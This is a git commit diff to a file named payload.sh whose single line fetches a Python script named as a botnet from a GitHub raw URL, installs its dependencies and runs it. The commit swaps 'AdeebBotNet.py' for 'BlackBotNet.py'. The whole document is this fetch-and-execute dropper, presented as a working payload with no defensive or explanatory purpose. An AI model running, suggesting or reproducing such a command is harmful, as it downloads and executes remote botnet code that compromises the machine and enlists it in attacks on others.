7e5ebcae0a6346c31babe47dc5239acb0a62dfaa
AdeebToPro <128822866+AdeebToPro@users.noreply.github.com>
2023-12-16 11:40:28 +0800

    Update payload.sh

--- payload.sh
+++ payload.sh
@@ -1,1 +1,1 @@
-wget https://raw.githubusercontent.com/AdeebToPro/BotPrivate/main/AdeebBotNet.py && pip install cloudscraper requests pycryptodome && python AdeebBotNet.py
+wget https://raw.githubusercontent.com/AdeebToPro/BotPrivate/main/BlackBotNet.py && pip install cloudscraper requests pycryptodome && python3 BlackBotNet.py
